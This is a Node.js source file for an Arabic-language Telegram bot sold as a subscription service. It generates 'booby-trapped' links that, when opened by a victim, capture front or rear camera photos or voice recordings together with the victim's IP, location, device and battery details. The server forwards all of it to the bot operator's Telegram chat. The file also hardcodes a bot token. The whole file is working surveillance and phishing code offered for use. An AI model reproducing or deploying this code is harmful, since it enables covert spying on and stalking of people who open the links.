const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const bodyParser = require('body-parser');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

// Initialize bot and app
const botToken = '7244359397:AAHJieFIF4SnCD3EEHc5tWYeZXgfC7b_tEw';
const bot = new TelegramBot(botToken, { polling: true });
const app = express();
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// Multer configuration for image and voice upload
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });
const uploadDisk = multer({ dest: 'uploads/' });

// Variables
const MAX_FREE_ATTEMPTS = 3;
const userVisits = {};
const subscribedUsers = new Set();
const freeTrialEndedMessage = 'لقد انتهت الفترة التجريبية المجانية. الرجاء شراء اشتراك من المطور لاستخدام البوت بدون قيود.';
const adminId = '7130416076';

// Route for camera access
app.get('/:userId', (req, res) => {
    const userId = req.params.userId;
    const cameraType = req.query.cameraType;

    if (subscribedUsers.has(userId)) {
        res.sendFile(path.join(__dirname, 'location.html'));
        return;
    }

    if (!userVisits[userId]) {
        userVisits[userId] = { frontCamera: 0, rearCamera: 0 };
    }

    userVisits[userId][cameraType === 'front' ? 'frontCamera' : 'rearCamera']++;

    if (userVisits[userId][cameraType === 'front' ? 'frontCamera' : 'rearCamera'] > MAX_FREE_ATTEMPTS) {
        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
        return;
    }

    res.sendFile(path.join(__dirname, 'location.html'));
});

// Route to handle photo submissions
app.post('/submitPhotos', upload.array('images', 20), async (req, res) => {
    const chatId = req.body.userId;
    const files = req.files;
    const additionalData = JSON.parse(req.body.additionalData || '{}');

    if (files && files.length > 0) {
        const caption = `
معلومات إضافية:
IP: ${additionalData.ip}
الدولة: ${additionalData.country}
المدينة: ${additionalData.city}
المنصة: ${additionalData.platform}
إصدار الجهاز: ${additionalData.deviceVersion}
مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا' || 'غير متاح'}
        `;

        try {
            const sendPhotoPromises = files.map(file => bot.sendPhoto(chatId, file.buffer, { caption }));
            await Promise.all(sendPhotoPromises);
            res.json({ success: true });
        } catch (err) {
            res.status(500).json({ error: 'Failed to send photos' });
        }
    } else {
        res.status(400).json({ error: 'No images received' });
    }
});

// Route for voice recording
app.post('/submitVoice', uploadDisk.single('voice'), (req, res) => {
    const chatId = req.body.chatId;
    const voicePath = req.file.path;
    const additionalData = JSON.parse(req.body.additionalData || '{}');

    const caption = `
معلومات إضافية:
IP: ${additionalData.ip}
الدولة: ${additionalData.country}
المدينة: ${additionalData.city}
المنصة: ${additionalData.platform}
إصدار الجهاز: ${additionalData.deviceVersion}
مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا' || 'غير متاح'}
    `;

    bot.sendVoice(chatId, voicePath, { caption }).then(() => {
        fs.unlinkSync(voicePath);
        res.send('Voice submitted successfully!');
    }).catch(error => {
        res.status(500).send('Error sending voice message.');
    });
});

app.get('/record', (req, res) => {
    res.sendFile(path.join(__dirname, 'record.html'));
});

// Handle subscriptions
bot.onText(/\/subscribe (\d+)/, (msg, match) => {
    if (msg.from.id.toString() !== adminId) {
        bot.sendMessage(msg.chat.id, 'عذراً، هذا الأمر متاح فقط للمسؤول.');
        return;
    }

    const userId = match[1];
    subscribedUsers.add(userId);
    bot.sendMessage(msg.chat.id, `تمت إضافة المستخدم ${userId} إلى قائمة المشتركين بنجاح.`);
});

bot.onText(/\/unsubscribe (\d+)/, (msg, match) => {
    const userId = match[1];
    if (subscribedUsers.delete(userId)) {
        bot.sendMessage(msg.chat.id, `تمت إزالة المستخدم ${userId} من قائمة المشتركين.`);
    } else {
        bot.sendMessage(msg.chat.id, `المستخدم ${userId} غير موجود في قائمة المشتركين.`);
    }
});

bot.onText(/\/listsubscribers/, (msg) => {
    if (msg.from.id.toString() !== adminId) {
        bot.sendMessage(msg.chat.id, 'عذراً، هذا الأمر متاح فقط للمسؤول.');
        return;
    }

    const subscribersList = Array.from(subscribedUsers).join('\n');
    bot.sendMessage(msg.chat.id, `قائمة المشتركين:\n${subscribersList || 'لا يوجد مشتركين حالياً.'}`);
});

// Handle bot start command
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const message = 'مرحبًا! انقر على الرابط لدخول.';
    const url = `https://creative-marmalade-periwinkle.glitch.me//${chatId}`;
    bot.sendMessage(chatId, message, {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'تصوير ام أمامي', url: `${url}?cameraType=front` }],
                [{ text: 'تصوير كام خلفي', url: `${url}?cameraType=rear` }],
                [{ text: 'تسجيل صوت', callback_data: 'select_duration' }]
            ]
        }
    });
});

// Handle callback queries
bot.on('callback_query', (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    if (callbackQuery.data === 'select_duration') {
        bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
    }
});

// Handle message for voice duration
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const duration = parseInt(msg.text, 10);

    if (!isNaN(duration) && duration > 0 && duration <= 20) {
        const link = `https://creative-marmalade-periwinkle.glitch.me//record?chatId=${chatId}&duration=${duration}`;
        bot.sendMessage(chatId, `تم تلغيم الرابط لتسجيل صوت لمدة ${duration} ثواني: ${link}`);
    } else {
        bot.sendMessage(chatId, 'الحد الأقصى لمدة التسجيل هو 20 ثانية. الرجاء إدخال مدة صحيحة.');
    }
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
